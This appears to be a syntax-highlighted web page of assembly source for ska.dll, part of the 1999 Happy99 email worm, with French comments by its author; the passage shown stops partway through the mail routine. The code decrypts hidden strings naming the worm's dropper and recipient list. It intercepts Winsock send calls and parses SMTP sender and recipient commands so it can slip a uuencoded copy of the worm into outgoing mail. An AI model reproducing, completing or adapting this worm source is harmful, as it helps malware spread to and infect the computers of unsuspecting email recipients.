<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Happy - Happy99_ska_dll.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;ska.dll</span><span class="sc0">
</span><span class="sc1">;if you want to understand comments, learn french or use Altavista ;)</span><span class="sc0">
</span><span class="sc1">;at the very end, you can post a message for me in alt.comp.virus</span><span class="sc0">
</span><span class="sc1">;look at the readme.rtf with WordPad for some explanations</span><span class="sc0">

</span><span class="sc1">;--------------------------- (c) Spanska 1999 ---------------------------------</span><span class="sc0">

</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***                               API WINDOWS UTILISEES                                 ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">recv</span><span class="sc0">            </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">WSAGetLastError</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">LocalAlloc</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">LocalFree</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">CreateFileA</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">CreateFileMappingA</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">MapViewOfFile</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">GetFileSize</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">CloseHandle</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">WriteFile</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">ReadFile</span><span class="sc0">        </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">SetFilePointer</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***                                  ZONE DE DONNEES                                    ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc1">;======================== commandes pour les serveurs ======================================</span><span class="sc0">

</span><span class="sc5">smtp_sender_size</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">smtp_recipient_size</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">smtp_rset</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"RSET"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc5">size_smtp_rset</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">smtp_rset</span><span class="sc0">

</span><span class="sc5">smtp_data</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"DATA"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc5">size_smtp_data</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">smtp_data</span><span class="sc0">

</span><span class="sc5">nntp_post</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"POST"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc5">size_nntp_post</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nntp_post</span><span class="sc0">

</span><span class="sc5">point</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc2">2Eh</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">      </span><span class="sc1">;"."</span><span class="sc0">
</span><span class="sc5">size_point</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">point</span><span class="sc0">

</span><span class="sc1">;========================= données pour le uucodage ========================================</span><span class="sc0">

</span><span class="sc5">filemappinghandle</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">startoffilemapping</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sizeofmappedfile</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">nb_45</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">reste_45</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">nb_1000</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">reste_1000</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">size_uu_file</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">debut</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">     </span><span class="sc1">;db 0Dh,0Ah,"begin 644</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"igeb"</span><span class="sc0">           </span><span class="sc1">;Happy99.exe",0Dh,0Ah</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"46 n"</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"aH 4"</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"9ypp"</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"xe.9"</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"e"</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc5">size_debut</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut</span><span class="sc0">

</span><span class="sc5">fin</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc0">          </span><span class="sc1">;db 60h, 0Dh,0Ah,"end",0Dh,0Ah</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"e"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"n"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"d"</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc5">size_fin</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc0">

</span><span class="sc1">;============================== mes fichiers ===============================================</span><span class="sc0">

</span><span class="sc5">dropper_name</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"akS\"           ;db "</span><span class="sc0">\</span><span class="sc5">Ska.exe</span><span class="sc13">",0
</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"exe."</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dropper_name_size</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dropper_name</span><span class="sc0">

</span><span class="sc5">liste_name</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"sil\"           ;db "</span><span class="sc0">\</span><span class="sc5">liste.ska</span><span class="sc13">",0
</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"s.et"</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"ak"</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">liste_name_size</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">liste_name</span><span class="sc0">

</span><span class="sc5">dropper_handle</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">liste_handle</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">liste_size</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">system_dir_size</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc1">;=================================== divers =================================================</span><span class="sc0">

</span><span class="sc5">size_headers</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">offset_mem_buffer</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">original_send</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">no_socket</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">nb_rcpt</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">faut_pas_envoyer_mail</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">offset_mem_buffer2_headers</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;mem_buffer2</span><span class="sc0">
</span><span class="sc5">offset_mem_buffer2_recipient</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;mem_buffer2 + 3000 ;ne pas séparer</span><span class="sc0">
</span><span class="sc5">offset_mem_buffer2_sender</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;mem_buffer2 + 6000</span><span class="sc0">
</span><span class="sc5">offset_mem_buffer2_rcv</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;mem_buffer2 + 7000</span><span class="sc0">
</span><span class="sc5">offset_mem_buffer2_system_dir</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;mem_buffer2 + 7100</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">dll</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***                      ROUTINES D'INITIALISATION DE LA DLL                            ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc5">dllini</span><span class="sc0">
</span><span class="sc5">dllini</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc1">;------- Procédure de chargement ou de déchargement ?</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;1=DLL_PROCESS_DETACH ds la proc DllEntryPoint</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">dechargement_dll</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">;1=DLL_PROCESS_ATTACH ds la proc DllEntryPoint</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">chargement_dll</span><span class="sc0">       </span><span class="sc1">;pas 1, teste 0</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_ini_proc</span><span class="sc0">

</span><span class="sc1">;------ Cette routine est appelée à chaque chargement de la DLL</span><span class="sc0">

</span><span class="sc5">chargement_dll</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;----- décrypter les datas</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dropper_handle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut</span><span class="sc0">
</span><span class="sc5">decrypte</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">decrypte</span><span class="sc0">

</span><span class="sc1">;------- se réserver 5 Ko de mémoire pour headers/rcpt si ce n'est pas deja fait</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocalAlloc</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ca_baigne</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_ini_proc_with_problem</span><span class="sc0">

</span><span class="sc5">ca_baigne</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer2_headers</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3000</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3000</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_ini_proc</span><span class="sc0">

</span><span class="sc1">;------ Cette routine est appelée à chaque déchargement de la DLL</span><span class="sc0">

</span><span class="sc5">dechargement_dll</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer2_headers</span><span class="sc0">         </span><span class="sc1">;le petit tampon intermédiaire</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocalFree</span><span class="sc0">

</span><span class="sc5">end_ini_proc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">end_ini_proc_with_problem</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">dllini</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***                                ROUTINE SEND MAIL                                    ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc5">mail</span><span class="sc0">
</span><span class="sc5">mail</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc1">;----localise les données de la commande send</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recuperer_offset_et_taille_envoi</span><span class="sc0">       </span><span class="sc1">;nique ebx, ecx, retourne ebx, ecx</span><span class="sc0">

</span><span class="sc1">;----- voir si ce qui est envoyé est une commande au serveur ou le corps d'un message</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">c_pas_une_commande_au_serveur</span><span class="sc0">

</span><span class="sc1">;==================== analyser la commande au serveur ==============================</span><span class="sc0">

</span><span class="sc1">;----- c'est une commande au serveur: récupérer des infos</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFDFDFDFh</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"LIAM"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">c_pas_from</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFDFDFFFh</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"ORF "</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">c_pas_from</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFDFh</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">":M"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">c_pas_from</span><span class="sc0">

</span><span class="sc1">;---- si c'est la commande "from", on récupère l'envoyeur et sa taille</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc1">;mov edi, offset smtp_sender</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer2_sender</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">smtp_sender_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">fin_routine_mail_sans_dechargement</span><span class="sc0">

</span><span class="sc1">;----analyse les données de la commande send</span><span class="sc0">

</span><span class="sc5">c_pas_from</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFDFDFDFh</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"TPCR"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">c_pas_to</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFDFDFFFh</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">":OT "</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">c_pas_to</span><span class="sc0">

</span><span class="sc1">;---- si c'est la commande "to", on stocke ce rcpt</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">stocke_le_rcpt</span><span class="sc0">

</span><span class="sc1">;---- on vérifie que ce destinataire n'a pas déjà recu le dropper</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">smtp_recipient_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">verifie_destinataire</span><span class="sc0">       </span><span class="sc1">;nique eax, retour eax=-1 si faut pas envoyer, 0 sinon</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">fin_routine_mail_sans_dechargement</span><span class="sc0">

</span><span class="sc1">;----- deja recu: on annule tout</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">faut_pas_envoyer_mail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">fin_routine_mail_sans_dechargement_mais_vidage_des_rcpt</span><span class="sc0">

</span><span class="sc1">;----- fin d'analyse des commandes</span><span class="sc0">

</span><span class="sc5">c_pas_to</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">fin_routine_mail_sans_dechargement</span><span class="sc0">

</span><span class="sc1">;================= ce n'est pas une commande, mais un gros send ==========================</span><span class="sc0">

</span><span class="sc5">c_pas_une_commande_au_serveur</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;------ récupérer les headers</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recupere_headers</span><span class="sc0">               </span><span class="sc1">;nique eax, retour eax=-1 si couille, 0 si OK</span><span class="sc0">
